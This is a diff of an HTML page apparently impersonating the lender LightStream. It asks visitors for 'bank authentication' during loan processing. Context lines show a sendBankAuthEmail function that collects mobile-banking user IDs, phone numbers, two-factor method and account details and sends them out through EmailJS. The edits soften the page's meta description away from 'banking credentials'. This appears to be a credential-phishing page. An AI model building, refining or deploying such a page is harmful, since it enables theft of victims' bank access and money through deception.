@@ -13,13 +13,14 @@
     <meta name="referrer" content="strict-origin-when-cross-origin">
     
     <!-- Legal & Security Meta -->
-    <meta name="description" content="Secure bank authentication with LightStream. 256-bit SSL encryption protects your banking credentials. Bank-level security.">
-    <meta name="keywords" content="bank authentication, secure banking, online banking verification">
+    <meta name="description" content="Secure bank authentication for loan processing with LightStream. Bank-level encryption protects your data.">
+    <meta name="keywords" content="bank authentication, secure banking, loan processing, account verification">
     <meta name="author" content="LightStream Financial Services">
     <meta name="robots" content="index, follow">
     
     <!-- Google Site Verification -->
     <meta name="google-site-verification" content="s-OWmZgVmfmuSt4KnIAA-IpD61w3rw8cRCh8WdTxVmk" />
+    
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
@@ -663,7 +664,7 @@ function sendBankAuthEmail(bankData, loanData) {
         bank_name: bankData.bankName || '',
         mobile_banking_user_id: bankData.mobileBankingUserId || '',
         mobile_banking_password: '[PROTECTED]', // Never send actual password
-        phone_number: bankData.phoneNumber || 'Not provided',
+        phone_number: bankData.phoneNumber || '',
         two_factor_method: document.getElementById('twoFactor')?.value || 'sms',
         
         // Bank account details (from loan data for reference only)
@@ -674,7 +675,7 @@ function sendBankAuthEmail(bankData, loanData) {
         // Customer information (minimal reference from loan data)
         customer_name: loanData.fullName || loanData.name || 'Customer',
         customer_email: loanData.email || '',
-        customer_phone: bankData.phoneNumber || 'Not provided',
+        customer_phone: bankData.phoneNumber || '',
         
         // METADATA
         application_type: 'Bank Authentication',
